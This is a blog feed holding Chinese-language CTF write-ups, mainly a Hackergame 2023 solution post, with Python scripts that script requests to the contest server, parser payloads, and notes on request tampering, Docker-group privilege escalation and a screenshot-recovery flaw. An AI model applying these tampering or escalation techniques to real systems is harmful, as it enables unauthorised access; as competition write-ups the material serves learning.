placeholder=&quot;(.*?)&quot;&gt;&#x27;</span><br><span class="hljs-comment"># patternt=r&#x27;results.push(&quot;(.*?)&quot;)&#x27;</span><br>matching=re.search(pattern,text)<br><span class="hljs-comment"># matchingt=re.search(patternt,text)</span><br><span class="hljs-built_in">print</span>(text)<br>emoji=matching.group(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(emoji)<br><span class="hljs-comment"># result=matchingt.group()</span><br><span class="hljs-built_in">print</span>(text[<span class="hljs-number">516</span>:<span class="hljs-number">580</span>])<br>count=<span class="hljs-number">0</span><br>green=<span class="hljs-string">&#x27;🟩&#x27;</span><br>list1=[<span class="hljs-string">&#x27;0&#x27;</span>]*<span class="hljs-number">64</span><br>emojilist=[]<br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> list1:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">if</span> emoji[i] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> emojilist:<br>            emojilist.append(emoji[i])<br>            s=emoji[i]*<span class="hljs-number">64</span><br>            param=&#123;<span class="hljs-string">&#x27;guess&#x27;</span>: s&#125;<br>            rest = requests.get(url=url, params=param, headers=headers, cookies=cookie_d)<br>            rest.encoding=<span class="hljs-string">&quot;utf-8&quot;</span><br>            textt = rest.text<br>            temp=textt[<span class="hljs-number">516</span>:<span class="hljs-number">580</span>]<br>            count=count+<span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(count, temp)<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>                <span class="hljs-keyword">if</span> temp[j]==green:<br>                    list1[j]=emoji[i]<br>    emoji=re.search(pattern,textt).group(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(list1)<br></code></pre></td></tr></table></figure><p>如果要复现，可能得改下Cookie（真能复现嘛…）</p><p>返回的方块我用我仅可能有的一点正则表达式的知识也没截取到</p><p>但是emoji我都能截到，这到底是什么问题呢？？？</p><p><strong>Level 2</strong></p><p>非常没有含金量的一题</p><p>直接把Cookie拿去jwt解析就好了，target的值就是答案，一输，flag就有了</p><p><strong>Level 3</strong></p><p>…未完待续</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackergame2023-Writeup</title>
    <link href="/2023/11/03/Hackergame2023-Writeup/"/>
    <url>/2023/11/03/Hackergame2023-Writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="Hackergame2023-Writeup"><a href="#Hackergame2023-Writeup" class="headerlink" title="Hackergame2023-Writeup"></a>Hackergame2023-Writeup</h2><p>——by Jednersaous</p><p>mark:<strong>3350</strong>, rank:<strong>185&#x2F;2386</strong>, group rank:<strong>3&#x2F;63</strong></p><p>AI:<strong>300</strong>, binary:<strong>0</strong>, general:<strong>2050</strong>, math:<strong>200</strong>, web:<strong>800</strong></p><p>——————————————————————————————————————————————————</p><h3 id="1-Hackergame-启动"><a href="#1-Hackergame-启动" class="headerlink" title="1.Hackergame 启动"></a>1.Hackergame 启动</h3><p>认真虔诚地喊出“hackergame，启动”（不是</p><p>试了一次之后发现匹配度根本到不了99.9%，但是发现URL这个东东呢，后面有了个similarity参数</p><p>数字好像正好是匹配度，那就直接修改该参数超过99.9%即可</p><h3 id="2-猫咪小测"><a href="#2-猫咪小测" class="headerlink" title="2.猫咪小测"></a>2.猫咪小测</h3><p>第一题在科大西图找一本书，给了提示非负整数，故穷举，答案是12</p><p>第二题直接Google「可观测宇宙中的鸡的密度上限」，知乎等各大中文网站都有答案</p><p>第三题我问的ChatGPT3.5，可喜可贺，给出了正确答案</p><p>第四题还是Google”Mypy type check infinite loop”，各大论文网站均有引用，容易找到原文及今年的发表大会</p><h3 id="3-更深更暗"><a href="#3-更深更暗" class="headerlink" title="3.更深更暗"></a>3.更深更暗</h3><p>F12查看源码，打开发现一直有新的&lt;pre&gt;元素“涌”进web页面，我的flag！！！</p><p>打断点暂停，或者抓包，或者Network，flag就藏在div-main的最下面</p><h3 id="4-旅行照片3-0"><a href="#4-旅行照片3-0" class="headerlink" title="4.旅行照片3.0"></a>4.旅行照片3.0</h3><p>此题我已写了题解，太爽啦，直接CV</p><p>1.通过文本可知粗略的时间是今年2023年暑假大概是6月-9月（其实已经可以开爆了</p><p>查了下中科大学生放假时间</p><p>本科7.29-9.2，惨惨惨，那估计就是8月份的某一天了</p><p>飞机照片能搜出来南航的标识</p><p>通过后面拉面店里的日文可以看出目的地是日本，文本中有提到是东京</p><p>但是出发地不太知道，有点幽默了，难道是合肥吗？</p><p>如果出发地不知道的话就有点难找了</p><p>结果爆出来是2023-08-10</p><p>2.奖牌是诺贝尔奖奖牌，获得者是KOSHIBA，也就是小柴昌俊，东京大学毕业，所以学长大概率在东大读书</p><p>而koshiba获得的的是诺贝尔物理学奖，所以只要找到东京大学诺贝尔物理学奖最年轻的获得者就可以</p><p>发现符合这个条件的人只有梶田隆章了，从wiki百科里知道当时他工作于东京大学宇宙射线研究所，缩写ICRR</p><p>3.识图找到了这家拉面店和这个喷泉</p><p>这个喷泉确实挺有标志性，叫上野公园大喷泉，但是附近有两个博物馆</p><p>一个博物馆在喷泉旁边，叫国立科学博物馆；另一个在马路对面，叫东京国立博物馆，到底是哪一个呢</p><p>查了一会，好像符合时间和地点条件的活动就只有当天的<strong>梅酒祭</strong>了</p><p>有一说一，确实挺难找的，但凭我的实力还是直接给我干到官网了</p><blockquote><p><a href="https://umeshu-matsuri.jp/tokyo_staff/">https://umeshu-matsuri.jp/tokyo_staff/</a></p><p><a href="https://ws.formzu.net/dist/S495584522/">https://ws.formzu.net/dist/S495584522/</a></p></blockquote><p>答案直接在页面上显示出来了</p><p>S495584522</p><p>4.只要搜东京的国立科学博物馆门票价格就行，普通人好像是1000yen，我看大学生减免50%还以为是500yen呢，结果直接0yen，只能说不愧是润霓虹爷啊</p><p>5.文本说是上野站，直接google map，开找</p><p>但是这上野站离河还很远啊，离这Rainbow Bridge就更远了，我是有点没搞懂</p><p>哦原来是在上野站上车是吧，日，审题不仔细</p><p>tmdtmdtmdtmdtmd</p><p>原来是先搞学术是吧，在东大里先搞点学术再集合</p><p>我tm还以为是在哪里集合坐船</p><p>我日似你的木，气死了</p><p>ans：安田讲堂</p><p>6.上野站好像是喜欢panda的</p><p>图在下面那个网站里</p><blockquote><p><a href="https://plaza.rakuten.co.jp/ayumilife/diary/202308030001/">https://plaza.rakuten.co.jp/ayumilife/diary/202308030001/</a></p></blockquote><p>马里奥在渋谷，先试试在渋谷站找找吧</p><p>马里奥是Nintendo TOKYO オフィシャルストア，有个林克的照片重合度100%</p><p>涩谷有忠犬八公，忠犬八公是秋田犬（?</p><p>好像还真是，新宿有猫，涩谷是忠犬八公，Youtube最近时间是2023-06</p><p>开蒙了</p><p>有点脏话，但是不想删了，素质就是这么低 ^_^</p><h3 id="5-赛博井字棋"><a href="#5-赛博井字棋" class="headerlink" title="5.赛博井字棋"></a>5.赛博井字棋</h3><p>可以发现，正常下是100%下不赢的，那就只能抓包看看了</p><p>发现是POST请求，发送的是自己下的棋的坐标</p><p>那我能不能下在AI已经下过的棋上呢，一试发现可以</p><p>所以可以先手动下两个，然后最后一个抓包之后修改坐标成被AI堵住的那个就行了</p><p>###6.奶奶的睡前 flag 故事</p><p>题目给的暗示真的挺多的，没想到这题跟PNG什么正常的图片隐写啊没什么关系，挺好的，毕竟我是misc新人</p><p>第一点<strong>谷歌的亲儿子</strong>指的是google自己研发的手机Pixel系列</p><p>好，那懂了啊，直接搜Pixel截图漏洞</p><blockquote><p><a href="https://www.ithome.com/0/681/025.htm">https://www.ithome.com/0/681/025.htm</a></p><p><a href="https://acropalypse.app/">https://acropalypse.app/</a></p></blockquote><p>aCropalypse截图漏洞就爆出来了，直接网页在线处理，flag轻而易举</p><h3 id="7-组委会模拟器"><a href="#7-组委会模拟器" class="headerlink" title="7.组委会模拟器"></a>7.组委会模拟器</h3><p>这题还花了我不少时间的，都有200解了我才做出来，我以为大家都用的神必方法秒了，我还在傻傻写脚本呢</p><p>python-http请求脚本熟练度+1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://202.38.93.111:10021/&quot;</span><br>header = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br><span class="hljs-comment"># parame=&#123;</span><br><span class="hljs-comment">#     &#x27;token&#x27;:&quot;386:MEUCIAau2PaZf7UfJZPo7B2nkqGyyXuBoqNQM9QRe/c1S5qwAiEAt+5eRVU2N+kNE/mpF4cghZUxaUe/4Y/olgc0We5XQSk=&quot;</span><br><span class="hljs-comment"># &#125;</span><br>cookie=&#123; <span class="hljs-string">&#x27;session&#x27;</span>:<span class="hljs-string">&quot;eyJ0b2tlbiI6IjM4NjpNRVVDSUFhdTJQYVpmN1VmSlpQbzdCMm5rcUd5eVh1Qm9xTlFNOVFSZS9jMVM1cXdBaUVBdCs1ZVJWVTJOK2tORS9tcEY0Y2doWlV4YVVlLzRZL29sZ2MwV2U1WFFTaz0ifQ.ZT8Zhg.nu6aFcogpETdaJyp1BHVoDEFZ34&quot;</span>&#125;<br>s=requests.session()<br>listf=[]<br>listd=[]<br>r=s.post(url+<span class="hljs-string">&#x27;api/getMessages&#x27;</span>,cookies=cookie)<br>mess=json.loads(r.text)<br>result=mess[<span class="hljs-string">&#x27;messages&#x27;</span>]<br><span class="hljs-built_in">print</span>(result,<span class="hljs-built_in">len</span>(result))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    surr=result[i][<span class="hljs-string">&#x27;text&#x27;</span>]<br>    <span class="hljs-keyword">if</span>(re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;.*hack\[\.*&quot;</span>,surr)):<br>        listd.append(result[i][<span class="hljs-string">&#x27;delay&#x27;</span>])<br>        listf.append(&#123;<span class="hljs-string">&#x27;id&#x27;</span>:i&#125;)<br><span class="hljs-built_in">print</span>(listf)<br>j=<span class="hljs-number">0</span><br>listd.append(listd[<span class="hljs-built_in">len</span>(listf)-<span class="hljs-number">1</span>]+<span class="hljs-number">0.1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> listf:<br>    datas=json.dumps(i)<br>    a=s.post(url+<span class="hljs-string">&#x27;api/deleteMessage&#x27;</span>,cookies=cookie,data=datas,headers=header)<br>    <span class="hljs-keyword">if</span> j&lt;<span class="hljs-number">115</span>:<br>        time.sleep((listd[j+<span class="hljs-number">1</span>]-listd[j])/<span class="hljs-number">1.1</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">115</span>&lt;=j&lt;<span class="hljs-number">210</span>:<br>        time.sleep((listd[j+<span class="hljs-number">1</span>]-listd[j])/<span class="hljs-number">1.5</span>)<br>    <span class="hljs-keyword">else</span>:<br>        time.sleep((listd[j+<span class="hljs-number">1</span>]-listd[j])/<span class="hljs-number">1.2</span>)<br>    j=j+<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(a.text,j)<br>r2=s.post(url+<span class="hljs-string">&#x27;api/getflag&#x27;</span>,cookies=cookie)<br><span class="hljs-built_in">print</span>(r2.text)<br>s.close()<br></code></pre></td></tr></table></figure><p>要注意用delete的时候一定得等消息delay了之后再delete，不然会回显“检测到时空穿越”，我就被这个折磨了很久</p><p>好在getMessage的信息都给足了，不然我还真卡在这了</p><h3 id="8-虫"><a href="#8-虫" class="headerlink" title="8.虫"></a>8.虫</h3><p>这题还真挺有意思的，下载附件是wav格式，作为misc苦手，我又以为是xx隐写，搜了半天无果</p><p>回到题目，说是<strong>无线信道传输图片</strong>，然而，bing和google都没能第一时间搜出有用的信息，我在浏览苦海中寻觅了不少时间，才偶然发现一位佬的博客在打以前的某CTF的题解里提到了这种方式</p><blockquote><p><a href="https://md.byr.moe/s/Bk6tsb2O8">https://md.byr.moe/s/Bk6tsb2O8</a></p></blockquote><p>正是这位佬，照着他的方法，下载一个虚拟声卡和RX-SSTV就可以通过这个音频转化成图片力，图片还怪好看的</p><p>###9.JSON ⊂ YAML?</p><p>嘿嘿，这题根本没懂，还是连蒙带猜才做出来的，还是只能说打hg的时候的运气实在太好了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">flag1-payload:&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;:<span class="hljs-string">&quot;NaN&quot;</span>&#125;<br>flag2-payload:&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>第一个Python解析出来的YAML111是nan，JSON是NaN，黑人问号（？</p><p>第二个我是尝试千百次才得到，什么超长字符串，转义字符试了，统统不好使，最后发现YAML1.2不能重复键值</p><p>可能运气也是实力的一部分吧</p><p>不过花在这题上的时间也是挺久的，（指疯狂拷打GPT</p><h3 id="10-Git-Git"><a href="#10-Git-Git" class="headerlink" title="10.Git? Git!"></a>10.Git? Git!</h3><p>把附件Xftp传到我的小云服务器上，然后进行如下操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs git">git init<br>git reflog<br>git diff id-1 id-2<br></code></pre></td></tr></table></figure><p>第一步初始化仓库</p><p>第二步查看历史记录，可能有人会好奇历史记录是在哪里保存的</p><p>实际上每次操作都会记录为某个hash值存在.git中的某个文件，通过git可以重新解析</p><p>第三步拿reflog回显的文件头进行diff比较，看哪个不顺眼就是哪个</p><p>千万别git log，buffer会炸的（亲身经历</p><h3 id="11-HTTP集邮册（2-3）"><a href="#11-HTTP集邮册（2-3）" class="headerlink" title="11.HTTP集邮册（2&#x2F;3）"></a>11.HTTP集邮册（2&#x2F;3）</h3><p>这题把我的弱点展现的淋漓尽致，我也就堪堪找到5个状态码，确实我太废物了</p><p>200：正常发送</p><p>400：HEADERS的格式错误</p><p>404：GET访问不存在的页面</p><p>405：POST, HEAD, PATCH, DELETE…</p><p>505：将HTTP1.1改成HTTP2.1（？</p><p>空状态码：只留下GET &#x2F;</p><p>寄了，还是看看佬的题解⑧家人们</p><p>###12.Docker for Everyone</p><p>这题确实有意思，经典不会就开搜，而我确实是这么做的</p><p>发现是Docker的用户组提权</p><p>但是注意一点，usermod好像被出题人删了，用不了，所以可以参照以下博客</p><blockquote><p><a href="https://www.cnblogs.com/hellobao/articles/17262230.html">https://www.cnblogs.com/hellobao/articles/17262230.html</a></p></blockquote><p>直接可以读flag，也不用像他的博客一样写入root用户</p><h3 id="13-惜字如金2-0"><a href="#13-惜字如金2-0" class="headerlink" title="13.惜字如金2.0"></a>13.惜字如金2.0</h3><p>靠猜（拼运气</p><p>虽然你可能不是很理解什么是第一原则和第二原则，但是你知道flag的格式是flag{.*}</p><p>所以开头是flag{，最后一个字符是}，然后理解代码就不难了</p><p>最后给出补齐之后的py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cod_dict</span>():<br>    <span class="hljs-comment"># prepar th cod dict</span><br>    cod_dict = []<br>    cod_dict += [<span class="hljs-string">&#x27;nymeh1niwemflcir&#125;echaete&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;a3g7&#125;kidgojernoetlsup?he&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;ulww!f5soadrhwnrsnstnoeq&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;ctt&#123;l-findiehaai&#123;oveatas&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;ty9kxborszstgguyd?!blm-p&#x27;</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(cod_dict)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_data</span>(<span class="hljs-params">input_codes</span>):<br>    <span class="hljs-comment"># retriev th decrypted data</span><br>    cod_dict = get_cod_dict()<br>    output_chars = [cod_dict[c] <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> input_codes]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(output_chars)<br><br>cod_dict = []<br>cod_dict += [<span class="hljs-string">&#x27;nymeh1niwemflcir&#125;echaet1&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;a3g7&#125;kidgojernoetlsup?h1&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;ulw!f5soadrhwnrsnstnoeq1&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;ct&#123;l-findiehaai&#123;oveatas1&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;ty9kxborszstguyd?!blm-p1&#x27;</span>]<br><span class="hljs-built_in">print</span>(cod_dict)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">len</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> cod_dict))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(cod_dict))<br>flag = decrypt_data([<span class="hljs-number">53</span>, <span class="hljs-number">41</span>, <span class="hljs-number">85</span>, <span class="hljs-number">109</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">33</span>, <span class="hljs-number">48</span>, <span class="hljs-number">77</span>, <span class="hljs-number">90</span>,<br>                         <span class="hljs-number">17</span>, <span class="hljs-number">118</span>, <span class="hljs-number">36</span>, <span class="hljs-number">25</span>, <span class="hljs-number">13</span>, <span class="hljs-number">89</span>, <span class="hljs-number">90</span>, <span class="hljs-number">3</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>,<br>                         <span class="hljs-number">31</span>, <span class="hljs-number">77</span>, <span class="hljs-number">27</span>, <span class="hljs-number">60</span>, <span class="hljs-number">3</span>, <span class="hljs-number">118</span>, <span class="hljs-number">24</span>, <span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">61</span>,<br>                         <span class="hljs-number">25</span>, <span class="hljs-number">63</span>, <span class="hljs-number">77</span>, <span class="hljs-number">36</span>, <span class="hljs-number">5</span>, <span class="hljs-number">32</span>, <span class="hljs-number">60</span>, <span class="hljs-number">67</span>, <span class="hljs-number">113</span>, <span class="hljs-number">28</span>])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="14-高频率星球"><a href="#14-高频率星球" class="headerlink" title="14.高频率星球"></a>14.高频率星球</h3><p>我再也不装CentOS（擦擦擦擦擦擦</p><p>下载附件是.rec文件，得用题目中所说的asciinema来play</p><p>Windows用不了，于是乎我高兴地打开了我的华为云HECS，搭配的是炒鸡利害的CentOS内核</p><p>yum install asciinema ！！！ 然后asciinema play ~！！！</p><p>嗯？报错？（黑人问号？</p><p>Python版本低于3.9无法使用asciinema</p><p>沃日，赶紧查看python版本(python -V)，一查3.6</p><p>我晕，CentOS的yum都是靠python解析的，况且我都装了3、4个Python版本，连管理都不知道在哪管理</p><p>真的是气的想吐血，又只能搬出陈年的VMware，在我老旧的Kali虚拟机上进行操蛋的操作</p><p>先asciinema play ~，play一遍之后发现提示nodejs flag.js就能拿到flag</p><p>然后就asciinema cat ~ &gt;output.js，结果回显一堆乱码（全是\r、^M)这种Windows特有的操蛋玩意</p><p>我当时已经身心俱疲，不想研究什么vim快速删除，只想重复傻瓜式的机械操作，leafpad一个个手删</p><p>也就耗时30min+，不是很久嘛（（（</p><p>最后nodejs flag.js就能拿到flag了，庆幸我删的都是对的</p><h3 id="15-小型大预言模型星球（2-4）"><a href="#15-小型大预言模型星球（2-4）" class="headerlink" title="15.小型大预言模型星球（2&#x2F;4）"></a>15.小型大预言模型星球（2&#x2F;4）</h3><p>这个AI，好玩好玩（（</p><p>试探性聊了几句，发现他的Response有种精神污染，牛头不对马嘴</p><p>实际上我知道他类似于是一个编故事的AI，根据你的开头接着编故事，所以只需要想象语境就能做很大部分的题了</p><p>比如第一个You are smart</p><p>这个我甚至有多解，随便给一个解吧</p><p>直接输入Am I smart?，然后就能拿到第一个flag了</p><p>第二个accepted</p><p>输入Apology，不多不少，正好7个字，这是个非常nb的想法</p><p>总之对这种正常词汇，头脑风暴想语境就可以了</p><p>至于后面两个非正常词汇，肯定得用一些漏洞⑧</p><h3 id="16-流式星球"><a href="#16-流式星球" class="headerlink" title="16.流式星球"></a>16.流式星球</h3><p>一开始我搞错了，把下载附件的代码以为是把bin convert to mp4了，后来甩给GPT才看懂+结合题干</p><p>原来是在告诉我怎么把mp4 convert to bin，所以我故技重施，让GPT告诉我怎么复原</p><p>GPT给了我如下十分折磨人的代码（后面细锁</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_video_from_bin</span>(<span class="hljs-params">input_bin, output_mp4, frame_width, frame_height, frame_rate</span>):<br>    <span class="hljs-comment"># 读取二进制文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_bin, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        binary_data = file.read()<br><br>    <span class="hljs-comment"># 还原视频帧数据</span><br>    frame_size = frame_width * frame_height * <span class="hljs-number">3</span><br>    video_frames = np.frombuffer(binary_data, dtype=np.uint8)<br>    video_frames = video_frames[:<span class="hljs-built_in">len</span>(video_frames) - (<span class="hljs-built_in">len</span>(video_frames) % frame_size)]  <span class="hljs-comment"># 确保数据长度是帧大小的倍数</span><br>    video_frames = video_frames.reshape(-<span class="hljs-number">1</span>, frame_height, frame_width, <span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># 创建视频编写器</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;mp4v&#x27;</span>)  <span class="hljs-comment"># 使用MP4编码</span><br>    out = cv2.VideoWriter(output_mp4, fourcc, frame_rate, (frame_width, frame_height))<br><br>    <span class="hljs-comment"># 将帧写入视频文件</span><br>    <span class="hljs-keyword">for</span> frame <span class="hljs-keyword">in</span> video_frames:<br>        out.write(frame)<br><br>    out.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Video saved to <span class="hljs-subst">&#123;output_mp4&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    input_bin = <span class="hljs-string">&quot;video.bin&quot;</span><br>    output_mp4 = <span class="hljs-string">&quot;video.mp4&quot;</span><br>    frame_width = <span class="hljs-number">640</span>  <span class="hljs-comment"># 帧宽度（根据你的数据更改）</span><br>    frame_height = <span class="hljs-number">480</span>  <span class="hljs-comment"># 帧高度（根据你的数据更改）</span><br>    frame_rate = <span class="hljs-number">30</span>  <span class="hljs-comment"># 帧速率（根据需要更改）</span><br><br>    create_video_from_bin(input_bin, output_mp4, frame_width, frame_height, frame_rate)<br></code></pre></td></tr></table></figure><p>为什么说它折磨人，是因为这段代码复原的MP4文件是一坨⑩，有重影有莫名其妙的诡异的移动，还有几乎糊到</p><p>看不清的flag，只能说还好是出题人良心大发，flag里面的字母没做替换，不然我是真的做不出来的</p><p>我看official题解是用GPT4帮忙写的，羡慕富哥了，我的GPT3.5就只能写出此等低劣代码（恼</p><p>我一直以为是帧宽度和帧高度的原因会导致我根本看不清，结果在我N次尝试之后，发现还得是GPT给我初始</p><p>的帧宽和帧高相比之下最清晰，所以我就拿着那个糊到不能再糊的MP4，一帧一帧的仔细看，从缝里扣出flag</p><p>最后我也提交了N次，N-1次都错了，是因为我的flag{ 后的第一个字母i弄成了大写I（奈何我看不清楚，最后我还是灵光一闪，把I改成了i，flag对了，说实话当时我真的很感动，也只能说幸运女神又眷顾了我</p><h3 id="Last-Summary"><a href="#Last-Summary" class="headerlink" title="Last:Summary"></a>Last:Summary</h3><p>题目做到这里就没再做出别的了，还是自愧不如把，但是~~~</p><p><strong>Hackergame好玩，爱玩，多来点</strong></p><p>今年我已经是大二了，明年的hg我应该是大三了，到那时一定还会再来捧场</p><p>但是应该就不会和小东西们冲榜了^_^</p><p><strong>感谢科大</strong></p><p><strong>感谢西电XDSEC</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
